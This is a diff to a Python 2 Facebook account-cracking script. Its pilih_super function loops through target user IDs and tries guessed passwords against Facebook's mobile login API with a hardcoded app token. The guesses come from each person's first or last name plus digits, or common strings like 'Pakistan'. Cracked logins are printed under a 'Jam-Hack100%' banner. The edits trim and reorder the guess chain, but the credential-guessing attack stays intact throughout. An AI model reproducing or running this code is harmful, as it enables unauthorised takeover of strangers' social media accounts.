@@ -319,8 +319,6 @@ def pilih_super():
 				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
 				oks.append(user+pass1)
                         else:
-				a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-				b = json.loads(a.text)
 			        pass2 = b['first_name'] + '123'										
                                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			        q = json.load(data)												
@@ -333,8 +331,6 @@ def pilih_super():
 				        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
 				        oks.append(user+pass2)
                                 else:
-					a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-					b = json.loads(a.text)
 				        pass3 = b['first_name'] + '1234'										
                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                q = json.load(data)												
@@ -347,8 +343,6 @@ def pilih_super():
 				                print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'											
 				                oks.append(user+pass3)
                                         else:
-						a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-						b = json.loads(a.text)
 			                        pass4 = b['first_name'] + '12345'									
 					        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					        q = json.load(data)										
@@ -361,8 +355,6 @@ def pilih_super():
 						        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'									
 						        oks.append(user+pass4)      							
 				                else:
-							a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-							b = json.loads(a.text)
 					                pass5 = '786786'									
 					                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					                q = json.load(data)										
@@ -375,8 +367,6 @@ def pilih_super():
 						                print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass5 + '\n'									
 						                oks.append(user+pass5)
                                                         else:
-								a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-								b = json.loads(a.text)
 			                                        pass6 = '000786'										
 			                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                        q = json.load(data)												
@@ -389,9 +379,7 @@ def pilih_super():
 				                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass6 + '\n'											
 				                                        oks.append(user+pass6)  								
 					                        else:
-									a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-									b = json.loads(a.text)
-						                        pass7 = '786000'										
+						                        pass7 = 'Pakistan'										
 			                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                q = json.load(data)												
 			                                                if 'access_token' in q:		
@@ -403,9 +391,7 @@ def pilih_super():
 				                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass7 + '\n'											
 				                                                oks.append(user+pass7)
                                                                         else:
-										a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-										b = json.loads(a.text)
-			                                                        pass8 = b['first_name'] + '12'							
+			                                                        pass8 = b['last_name'] + '123'							
 						                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                                q = json.load(data)								
 						                                if 'access_token' in q:	
@@ -429,63 +415,7 @@ def pilih_super():
 						                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']							
 						                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user					
 						                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass9 + '\n'							
-						                                                oks.append(user+pass9)	
-                                                                                        else:
-												a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-												b = json.loads(a.text)
-			                                                                        pass10 = 'Pakistan'											
-			                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                                                        q = json.load(data)												
-			                                                                        if 'access_token' in q:	
-								                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                        z = json.loads(x.text)
-				                                                                        print '\x1b[1;94m[  ✓  ] \x1b[1;92mJam-Hack100%'											
-				                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
-				                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
-				                                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass10 + '\n'											
-				                                                                        oks.append(user+pass10)  				
-						                                                else:
-													a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-													b = json.loads(a.text)
-							                                                pass11 = 'Pakistan1'											
-			                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			                                                                                q = json.load(data)												
-			                                                                                if 'access_token' in q:	
-								                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                                z = json.loads(x.text)
-				                                                                                print '\x1b[1;94m[  ✓  ] \x1b[1;92mJam-Hack100%'											
-				                                                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
-				                                                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user									
-				                                                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass11 + '\n'											
-				                                                                                oks.append(user+pass11)
-                                                                                                        else:
-														a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-														b = json.loads(a.text)
-			                                                                                        pass12 = b['last_name'] + '123'						
-								                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
-								                                                q = json.load(data)						
-								                                                if 'access_token' in q:		
-				                                                                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                                        z = json.loads(x.text)
-									                                                print '\x1b[1;94m[  ✓  ] \x1b[1;92mJam-Hack100%'					
-									                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
-									                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
-									                                                print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass12 + '\n'					
-									                                                oks.append(user+pass12)      
-						                                                                else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
-                                                                                                                        b = json.loads(a.text)
-								                                                        pass13 = b['first_name'] + '1122'						
-								                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
-								                                                        q = json.load(data)						
-								                                                        if 'access_token' in q:		
-				                                                                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				                                                                                                z = json.loads(x.text)
-									                                                        print '\x1b[1;94m[  ✓  ] \x1b[1;92mJam-Hack100%'					
-									                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']					
-									                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user				
-									                                                        print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass13 + '\n'					
-									                                                        oks.append(user+pass13)       
+						                                                oks.append(user+pass9)     
 											                                       
 																	
 															
